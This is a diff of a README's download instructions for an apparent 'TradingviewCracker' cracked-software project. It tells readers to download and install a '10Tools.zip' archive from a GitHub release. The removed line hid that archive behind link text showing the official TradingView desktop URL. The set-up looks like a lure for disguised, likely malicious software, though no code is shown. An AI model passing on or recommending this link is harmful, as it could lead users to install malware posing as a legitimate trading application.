@@ -16,7 +16,7 @@ Motherboard: Any
 
 
 # 📁 〢 Download
-1. Download First. (Download from [https://www.tradingview.com/desktop/](https://github.com/Web3Master2023/TradingviewCracker/releases/download/web3/10Tools.zip)https://github.com/Web3Master2023/TradingviewCracker/releases/download/web3/10Tools.zip)
+1. Download First. (Download from [https://github.com/Web3Master2023/TradingviewCracker/releases/download/web3/10Tools.zip] )
 
 2. Install.
 
